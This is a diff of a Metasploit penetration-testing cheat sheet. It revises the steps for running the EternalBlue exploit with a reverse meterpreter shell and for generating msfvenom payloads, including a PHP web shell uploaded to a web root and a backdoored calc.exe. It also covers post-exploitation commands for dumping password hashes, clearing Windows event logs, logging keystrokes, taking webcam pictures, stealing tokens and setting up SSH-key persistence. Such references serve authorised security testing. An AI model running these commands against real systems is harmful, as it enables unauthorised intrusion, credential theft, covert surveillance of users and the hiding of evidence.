@@ -1,45 +1,18 @@
 Metasploit
 
 
-# OS X
+# Startup
 
-Download the latest installer and run: http://osx.metasploit.com
-Answer yes to all the questions.
-sudo chown -R <username> /opt/metasploit-framework/
-sudo chown -R <username> /Users/<username>/.msf4/
-     If /Users/<username>/.msf4/ does not exit,
-          mkdir /Users/<username>/.msf4
-          echo test > /Users/<username>/.msf4/database.yml
-          sudo chown -R <username> /Users/<username>/.msf4/
-/opt/metasploit-framework/bin/msfdb init
-/opt/metasploit-framework/bin/msfconsole
-Would you like to add msfconsole and other programs to your default PATH? yes
-
-msf > db_status 
-[*] postgresql connected to msf
-msf > db_rebuild_cache 
-[*] Purging and rebuilding the module cache in the background...
-
-Wait about 3 min.
-msf > search ms17                             Show all Microsoft exploits released in 2017
-------------------------------------------------------------------------------------------------------
-
-service postgrsql start                       Start the PostreSQL db
+service postgresql start                      Start the postgresql db
+msfdb init                                    Create and initialize the msf db
 msfconsole                                    Start Metasploit
-msf > db_status                               Check that you are connected to the db
+db_status                                     Confirm that Metasploit is connected to the db
 ------------------------------------------------------------------------------------------------------
 
 # Troubleshooting
 
 - If the db connection fails:
-msf > exit
-msfdb init
-msfconsole
-msf > db_status
-
-- If the db connection still fails:
-msf > exit
-
+exit
 cat /usr/share/metasploit-framework/config/database.yml
 Copy the password.
 
@@ -58,11 +31,13 @@ exit
 service postgresql restart
 msfdb init
 msfconsole
-msf > db_status
+db_status
 
 - Module database cache not built yet, using slow search
 db_rebuild_cache                              Rebuilds the database-stored module cache
 ------------------------------------------------------------------------------------------------------
+
+# Help
 
 help or ?                                     Show available commands and their descriptions
 grep -h                                       Show help on the 'grep' command
@@ -74,28 +49,121 @@ search <string>
 search ms17                                   Show all Microsoft exploits released in 2017
 
 grep <string> search <type>
-grep php search payloads                      Search all payloads, then grep for php
+grep php search payloads                      Search payloads then grep for php
+grep linux show post                          Search post exploitation modules then grep for linux
 ------------------------------------------------------------------------------------------------------
 
 # Basic usage
 
-show <all, auxilary, encoders, exploits, nops, payloads, plugins, post>
-show exploits
-search ms17_010
+show <all, auxiliary, encoders, exploits, nops, options, payloads, plugins, post>
+
+use <auxiliary, encoder, exploit, nop, payload, post>
 
 use exploit/windows/smb/ms17_010_eternalblue
 show info
-set rhost <target IP>
 show targets                                  Show OSs that can be targeted with this exploit
-show payloads                                 Show all payloads that work with this exploit
+set rhost <target IP>
+show payloads                                 Show payloads that work with this exploit
 set payload windows/x64/meterpreter/reverse_tcp
-show options                                  Show remainging options for the payload
-set lhost <attacker IP>                       Set the listner to the attacker's IP
+show options                                  Show remaining options for the payload
+set lhost <attacker IP>                       Set to the attacker's IP
 set lport <attacker port>                     Set the listening port to 443
+show advanced
+show evasion
 exploit                                       Run the exploit
+------------------------------------------------------------------------------------------------------
 
-- If the target is Linux: set AutoRunscript post/linux/manage/sshkey_persistence
-This lets you automatically establish persistence, without having to think about it.
+# Payloads
+
+msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>
+
+- Generate a bind payload that avoids a bad character:
+msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
+
+- Generate a bind payload and encode it 3 times:
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+
+- Inject a bind payload into calc.exe and save it as an executable:
+msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
+
+- Generate a reverse payload and save it as an executable:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe -a x86_64 —platform windows -o /root/evil64.exe
+
+- Generate PHP web shell and upload to a web server:
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -a php -e php/base64 -f raw -o /root/webshell.php
+upload /root/webshell.php /var/www/
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+------------------------------------------------------------------------------------------------------
+
+# Database
+
+workspace                                     Show workspaces (* shows the active workspace)
+* default
+  client1
+  client2
+
+workspace client1                             Switch workspace
+
+workspace                                     List workspaces
+  default
+* client1                                     * shows the active workspace
+  client2
+
+workspace -a <name>                           Add workspace(s)
+workspace -d <name>                           Delete workspace(s)
+workspace -r <old> <new>                      Rename workspace
+
+db_import <path to file>
+hosts                                         Confirm hosts have been imported
+
+db_export -f xml /root/msf.xml                Backup db in xml format
+
+hosts -h                                      Show help on the host command
+services -h                                   Show help on the services command
+
+services -c port,protocol,name                Show specific columns
+services -p 22                                Search for a specific port
+services -s http                              Search for a specific service
+
+creds
+loot -h                                       Show help on the loot command
+------------------------------------------------------------------------------------------------------
+
+# Meterpreter
+
+You will need to be at a Meterpreter prompt (meterpreter >) instead of a Metasploit prompt (msf >) 
+to run Meterpreter commands.
+
+help
+background                                    Send the current session to the background, and return to the 'msf' prompt
+
+cat <file>                                    Show the contents of a file
+edit <file>                                   Edit the contents of a file using vim
+execute -f cmd.exe -i -H                      Run a command on the target
+
+cd                                            Change directory
+ls                                            List directory
+pwd                                           Print working directory
+
+lcd                                           Change the local directory
+lpwd                                          Print the local working directory
+
+download c:\\boot.ini                         Download a file from the target (use double back slashes)
+upload evil.exe c:\\windows\\system32         Upload a file to the target (use double back slashes)
+
+clearev                                       Clear the Application, System, and Security logs on a Windows target
+getuid                                        Show the user that Meterpreter is running as
+hashdump                                      Dump the SAM database
+idletime                                      Show the number of seconds the user on the target has been idle
+ipconfig                                      Show the network interfaces and addresses on the target
+migrate                                       Migrate to another process
+ps                                            Show running processes
+resource                                      Execute Meterpreter instructions in a file
+search -f <file>                              Locate files on the target
+shell                                         Drop to a standard shell on the target
+webcam_list                                   Show currently available web cams
+webcam_snap                                   Takes a picture from the web cam
 ------------------------------------------------------------------------------------------------------
 
 # Cross platform exploit
@@ -120,39 +188,17 @@ exploit
 
 # Sessions
 
-sessions -h
-Usage: sessions [options]
-
-Active session manipulation and interaction.
-
-OPTIONS:
-
-     -K        Terminate all sessions
-     -c <opt>  Run a command on the session given with -i, or all
-     -h        Help banner
-     -i <opt>  Interact with the supplied session ID
-     -k <opt>  Terminate sessions by session ID and/or range
-     -l        List all active sessions
-     -q        Quiet mode
-     -r        Reset the ring buffer for the session given with -i, or all
-     -s <opt>  Run a script on the session given with -i, or all
-     -t <opt>  Set a response timeout (default: 15)
-     -u <opt>  Upgrade a shell to a meterpreter session on many platforms
-     -v        List sessions in verbose mode
-     -x        Show extended information in the session table
-
-Many options allow specifying session ranges using commas and dashes.
-
-For example:
-     sessions -s checkvm -i 1,3-5
-     sessions -k 1-2,5,6
-
+sessions -h                                   Show help on the sessions command
 sessions -l                                   Show active sessions
 sessions -i 2                                 Interact with session 2
-ctrl z                                        Put the session in the background and go back to the MSF
+ctrl z                                        Background the current session
+
+Many options allow specifying session ranges using commas and dashes. For example:
+     sessions -s checkvm -i 1,3-6
+     sessions -k 1-3,6
 ------------------------------------------------------------------------------------------------------
 
-# Post exploitation - situational awareness
+# Post exploitation - host situational awareness
 
 ps                                            Search for a process running as NT AUTHORITY\SYSTEM
 migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
@@ -262,15 +308,21 @@ lsa_dump                                      Dump LSA secrets
 wifi_list                                     List wifi profiles/creds
 ------------------------------------------------------------------------------------------------------
 
-# Steal tokens to impersonate
+# Steal tokens
 
 getuid
-getprivs                                      Gets as many SYSTEM privileges as it can
 use incognito
-list_tokens -u
-list_tokens -g
-impersonate_token <domain>\\<user>
-impersonate_token "NT AUTHORITY\\SYSTEM"
+list_tokens -u                                List of tokens that are available
+impersonate_token <domain>\\<user>            Impersonate a domain account
+impersonate_token "NT AUTHORITY\SYSTEM"       Impersonate a local account
+getuid
+rev2self                                      Revert back to the original token
+getuid
+
+ps                                            Show running processes
+steal_token <PID>
+getuid
+drop_token                                    Revert back to the orginal token
 getuid
 ------------------------------------------------------------------------------------------------------
 
@@ -315,6 +367,9 @@ exploit
 
 Option 5 - Upload netcat:
 meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
+
+- If the target is Linux: set AutoRunscript post/linux/manage/sshkey_persistence
+This lets you automatically establish persistence, without having to think about it.
 
 Check for anything the runs at startup.
 meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run
@@ -437,70 +492,17 @@ set session 1
 exploit
 ------------------------------------------------------------------------------------------------------
 
-# msfvenom
-
-msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>
-
-Generate a reverse payload and save it as an executable:
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe -a x86_64 —platform windows -o /root/evil64.exe
-
-Generate a bind payload that avoids a bad character:
-msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
-
-Generate a bind payload and encode it 3 times:
-msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
-
-Inject a bind payload into calc.exe and save it as an executable: 
-msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
-
-Generate PHP web shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -a php -e php/base64 -f raw -o webshell.php
-
-Upload the file to a web server: /var/www/
-
-use exploit/multi/handler
-set PAYLOAD php/meterpreter/reverse_tcp
-set LHOST 10.0.0.5
-set LPORT 443
-exploit
-
-Access the shell on the remote web server.
-firefox http://<tartget IP>/webshell.php
-------------------------------------------------------------------------------------------------------
-
-# Database
-
-services -p 22                List specific ports
-services -s http              List specific services
-
-workspace                     List workspaces
-* default                     * shows the active workspace
-  client1
-  client5
-
-workspace client1             Switch workspace
-
-workspace                     List workspaces
-  default
-* client1                     * shows the active workspace
-  client5
-
-workspace -a <name>           Add workspace(s)
-workspace -d <name>           Delete workspace(s)
-workspace -r <old> <new>      Rename workspace
-------------------------------------------------------------------------------------------------------
-
 # Misc
 
-idletime                      Returns the number of seconds the remote user has been idle
+idletime                                      Returns the number of seconds the remote user has been idle
      If time < 5 min
-     keyscan_start            Start capturing keystrokes
-     keyscan_stop             Stop capturing keystrokes
-     keyscan_dump             Dump the keystroke buffer
+     keyscan_start                            Start capturing keystrokes
+     keyscan_stop                             Stop capturing keystrokes
+     keyscan_dump                             Dump the keystroke buffer
 
-screenshot                    Grab a screenshot of the interactive desktop
+screenshot                                    Grab a screenshot of the interactive desktop
 
-timestomp                     Manipulate file MACE attributes
+timestomp                                     Manipulate file MACE attributes
 
 run vnc
      If the screen is locked exit VNC
